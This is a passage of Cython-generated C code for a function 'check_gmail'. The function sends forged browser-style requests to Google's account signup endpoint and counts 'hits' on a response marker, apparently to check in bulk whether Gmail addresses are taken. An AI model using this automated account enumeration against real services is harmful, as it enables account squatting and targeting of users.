  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *(*__pyx_t_17)(PyObject *);
  Py_ssize_t __pyx_t_18;
  Py_UCS4 __pyx_t_19;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("check_gmail", 0);
  __Pyx_INCREF(__pyx_v_email);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __pyx_t_4 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u__31, __pyx_v_email, Py_EQ)); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 458, __pyx_L3_error)
      __pyx_t_5 = (__pyx_t_4 != 0);
      if (__pyx_t_5) {

        
        __pyx_t_6 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_v_email); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 459, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_7 = PyUnicode_Split(((PyObject*)__pyx_t_6), __pyx_kp_u__31, -1L); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 459, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_GetItemInt_List(__pyx_t_7, 0, long, 1, __Pyx_PyInt_From_long, 1, 0, 1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 459, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_DECREF_SET(__pyx_v_email, __pyx_t_6);
        __pyx_t_6 = 0;

        
      }

      
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_9, &__pyx_t_10);
        __Pyx_XGOTREF(__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_9);
        __Pyx_XGOTREF(__pyx_t_10);
        /*try:*/ {

          
          __pyx_t_11 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__32, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 462, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_read); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 462, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __pyx_t_11 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
            __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_12);
            if (likely(__pyx_t_11)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
              __Pyx_INCREF(__pyx_t_11);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_12, function);
            }
          }
          __pyx_t_7 = (__pyx_t_11) ? __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_11) : __Pyx_PyObject_CallNoArg(__pyx_t_12);
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 462, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_splitlines); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 462, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
            __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_12);
            if (likely(__pyx_t_7)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
              __Pyx_INCREF(__pyx_t_7);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_12, function);
            }
          }
          __pyx_t_6 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_12);
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 462, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_GetItemInt(__pyx_t_6, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 462, __pyx_L10_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_v_o = __pyx_t_12;
          __pyx_t_12 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        goto __pyx_L15_try_end;
        __pyx_L10_error:;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;

        
        __pyx_t_13 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
        if (__pyx_t_13) {
          __Pyx_AddTraceback("source.check_gmail", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_12, &__pyx_t_6, &__pyx_t_7) < 0) __PYX_ERR(0, 463, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_GOTREF(__pyx_t_7);

          
          __pyx_t_15 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__32, NULL); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 464, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_15);
          __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_t_15, __pyx_n_s_read); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 464, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          __pyx_t_15 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
            __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_16);
            if (likely(__pyx_t_15)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
              __Pyx_INCREF(__pyx_t_15);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_16, function);
            }
          }
          __pyx_t_14 = (__pyx_t_15) ? __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_t_15) : __Pyx_PyObject_CallNoArg(__pyx_t_16);
          __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
          if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 464, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_n_s_splitlines); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 464, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_t_14 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
            __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_16);
            if (likely(__pyx_t_14)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
              __Pyx_INCREF(__pyx_t_14);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_16, function);
            }
          }
          __pyx_t_11 = (__pyx_t_14) ? __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_t_14) : __Pyx_PyObject_CallNoArg(__pyx_t_16);
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 464, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_t_16 = __Pyx_GetItemInt(__pyx_t_11, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 464, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_XDECREF_SET(__pyx_v_o, __pyx_t_16);
          __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          goto __pyx_L11_exception_handled;
        }
        goto __pyx_L12_except_error;
        __pyx_L12_except_error:;

        
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_XGIVEREF(__pyx_t_10);
        __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
        goto __pyx_L3_error;
        __pyx_L11_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_XGIVEREF(__pyx_t_10);
        __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
        __pyx_L15_try_end:;
      }

      
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_o, __pyx_n_s_split); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 466, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_12 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_12)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_12);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_7 = (__pyx_t_12) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_12, __pyx_kp_u__29) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_u__29);
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 466, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      if ((likely(PyTuple_CheckExact(__pyx_t_7))) || (PyList_CheckExact(__pyx_t_7))) {
        PyObject* sequence = __pyx_t_7;
        Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
        if (unlikely(size != 2)) {
          if (size > 2) __Pyx_RaiseTooManyValuesError(2);
          else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
          __PYX_ERR(0, 466, __pyx_L3_error)
        }
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        if (likely(PyTuple_CheckExact(sequence))) {
          __pyx_t_6 = PyTuple_GET_ITEM(sequence, 0); 
          __pyx_t_12 = PyTuple_GET_ITEM(sequence, 1); 
        } else {
          __pyx_t_6 = PyList_GET_ITEM(sequence, 0); 
          __pyx_t_12 = PyList_GET_ITEM(sequence, 1); 
        }
        __Pyx_INCREF(__pyx_t_6);
        __Pyx_INCREF(__pyx_t_12);
        #else
        __pyx_t_6 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 466, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_12 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 466, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        #endif
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      } else {
        Py_ssize_t index = -1;
        __pyx_t_16 = PyObject_GetIter(__pyx_t_7); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 466, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_17 = Py_TYPE(__pyx_t_16)->tp_iternext;
        index = 0; __pyx_t_6 = __pyx_t_17(__pyx_t_16); if (unlikely(!__pyx_t_6)) goto __pyx_L18_unpacking_failed;
        __Pyx_GOTREF(__pyx_t_6);
        index = 1; __pyx_t_12 = __pyx_t_17(__pyx_t_16); if (unlikely(!__pyx_t_12)) goto __pyx_L18_unpacking_failed;
        __Pyx_GOTREF(__pyx_t_12);
        if (__Pyx_IternextUnpackEndCheck(__pyx_t_17(__pyx_t_16), 2) < 0) __PYX_ERR(0, 466, __pyx_L3_error)
        __pyx_t_17 = NULL;
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        goto __pyx_L19_unpacking_done;
        __pyx_L18_unpacking_failed:;
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_17 = NULL;
        if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
        __PYX_ERR(0, 466, __pyx_L3_error)
        __pyx_L19_unpacking_done:;
      }
      __pyx_v_tl = __pyx_t_6;
      __pyx_t_6 = 0;
      __pyx_v_host = __pyx_t_12;
      __pyx_t_12 = 0;

      
      __pyx_t_7 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 469, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_t_7, __pyx_kp_u_Host_GAPS, __pyx_v_host) < 0) __PYX_ERR(0, 469, __pyx_L3_error)
      __pyx_v_cookies = ((PyObject*)__pyx_t_7);
      __pyx_t_7 = 0;

      
      __pyx_t_7 = __Pyx_PyDict_NewPresized(8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 472, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_authority, __pyx_kp_u_accounts_google_com) < 0) __PYX_ERR(0, 472, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_accept, __pyx_kp_u__22) < 0) __PYX_ERR(0, 472, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_7, __pyx_kp_u_accept_language, __pyx_kp_u_en_US_en_q_0_9) < 0) __PYX_ERR(0, 472, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_7, __pyx_kp_u_content_type, __pyx_kp_u_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 472, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_7, __pyx_kp_u_google_accounts_xsrf, __pyx_kp_u_1) < 0) __PYX_ERR(0, 472, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_origin, __pyx_kp_u_https_accounts_google_com) < 0) __PYX_ERR(0, 472, __pyx_L3_error)

      
      __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_v_tl, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 478, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_12);
      __pyx_t_6 = __Pyx_PyUnicode_Concat(__pyx_kp_u_https_accounts_google_com_signup_2, __pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 478, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_referer, __pyx_t_6) < 0) __PYX_ERR(0, 472, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_ggb); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 479, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_12);
      __pyx_t_16 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_12))) {
        __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_12);
        if (likely(__pyx_t_16)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
          __Pyx_INCREF(__pyx_t_16);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_12, function);
        }
      }
      __pyx_t_6 = (__pyx_t_16) ? __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_16) : __Pyx_PyObject_CallNoArg(__pyx_t_12);
      __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 479, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      if (PyDict_SetItem(__pyx_t_7, __pyx_kp_u_user_agent, __pyx_t_6) < 0) __PYX_ERR(0, 472, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_headers = ((PyObject*)__pyx_t_7);
      __pyx_t_7 = 0;

      
      __pyx_t_7 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 482, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_TL, __pyx_v_tl) < 0) __PYX_ERR(0, 482, __pyx_L3_error)
      __pyx_v_params = ((PyObject*)__pyx_t_7);
      __pyx_t_7 = 0;

      
      __pyx_t_7 = PyTuple_New(5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 484, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_18 = 0;
      __pyx_t_19 = 127;
      __Pyx_INCREF(__pyx_kp_u_continue_https_3A_2F_2Fmail_goog);
      __pyx_t_18 += 119;
      __Pyx_GIVEREF(__pyx_kp_u_continue_https_3A_2F_2Fmail_goog);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_kp_u_continue_https_3A_2F_2Fmail_goog);

      
      __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_tl, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 485, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_19 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_19) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_19;
      __pyx_t_18 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_6);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_6);
      __pyx_t_6 = 0;
      __Pyx_INCREF(__pyx_kp_u_22_2C_22);
      __pyx_t_18 += 9;
      __Pyx_GIVEREF(__pyx_kp_u_22_2C_22);
      PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_kp_u_22_2C_22);
      __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_email, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 485, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_19 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_19) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_19;
      __pyx_t_18 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_6);
      PyTuple_SET_ITEM(__pyx_t_7, 3, __pyx_t_6);
      __pyx_t_6 = 0;
      __Pyx_INCREF(__pyx_kp_u_22_2C0_2C0_2C1_2Cnull_2C0_2C516);
      __pyx_t_18 += 360;
      __Pyx_GIVEREF(__pyx_kp_u_22_2C0_2C0_2C1_2Cnull_2C0_2C516);
      PyTuple_SET_ITEM(__pyx_t_7, 4, __pyx_kp_u_22_2C0_2C0_2C1_2Cnull_2C0_2C516);

      
      __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_7, 5, __pyx_t_18, __pyx_t_19); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 484, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_v_data = ((PyObject*)__pyx_t_6);
      __pyx_t_6 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_pp); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 487, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);

      
      __pyx_t_7 = __Pyx_PyDict_NewPresized(4); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 489, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_params, __pyx_v_params) < 0) __PYX_ERR(0, 489, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_cookies, __pyx_v_cookies) < 0) __PYX_ERR(0, 489, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 489, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 489, __pyx_L3_error)

      
      __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__33, __pyx_t_7); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 487, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_v_response = __pyx_t_12;
      __pyx_t_12 = 0;

      
      __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_text); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 494, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_12);
      __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_12); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 494, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_t_5 = (__Pyx_PyUnicode_ContainsTF(__pyx_kp_u_gf_uar_1, __pyx_t_7, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 494, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_4 = (__pyx_t_5 != 0);
      if (__pyx_t_4) {

        
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_hits); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 495, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_12 = __Pyx_PyInt_AddObjC(__pyx_t_7, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 495, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_hits, __pyx_t_12) < 0) __PYX_ERR(0, 495, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_pppp); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_6 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_12 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

        
        __pyx_t_4 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u__31, __pyx_v_email, Py_NE)); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 497, __pyx_L3_error)
        __pyx_t_5 = (__pyx_t_4 != 0);
        if (__pyx_t_5) {

          
          __pyx_t_12 = PyNumber_Add(__pyx_v_email, __pyx_kp_u_gmail_com); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 498, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_v_ok = __pyx_t_12;
          __pyx_t_12 = 0;

          
          __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_ok, __pyx_n_s_split); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 499, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_6 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_7);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_7, function);
            }
          }
          __pyx_t_12 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_6, __pyx_kp_u__31) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_kp_u__31);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 499, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          if ((likely(PyTuple_CheckExact(__pyx_t_12))) || (PyList_CheckExact(__pyx_t_12))) {
            PyObject* sequence = __pyx_t_12;
            Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
            if (unlikely(size != 2)) {
              if (size > 2) __Pyx_RaiseTooManyValuesError(2);
              else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
              __PYX_ERR(0, 499, __pyx_L3_error)
            }
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            if (likely(PyTuple_CheckExact(sequence))) {
              __pyx_t_7 = PyTuple_GET_ITEM(sequence, 0); 
              __pyx_t_6 = PyTuple_GET_ITEM(sequence, 1); 
            } else {
              __pyx_t_7 = PyList_GET_ITEM(sequence, 0); 
              __pyx_t_6 = PyList_GET_ITEM(sequence, 1); 
            }
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_6);
            #else
            __pyx_t_7 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 499, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_6 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 499, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            #endif
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          } else {
            Py_ssize_t index = -1;
            __pyx_t_16 = PyObject_GetIter(__pyx_t_12); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 499, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_16);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __pyx_t_17 = Py_TYPE(__pyx_t_16)->tp_iternext;
            index = 0; __pyx_t_7 = __pyx_t_17(__pyx_t_16); if (unlikely(!__pyx_t_7)) goto __pyx_L22_unpacking_failed;
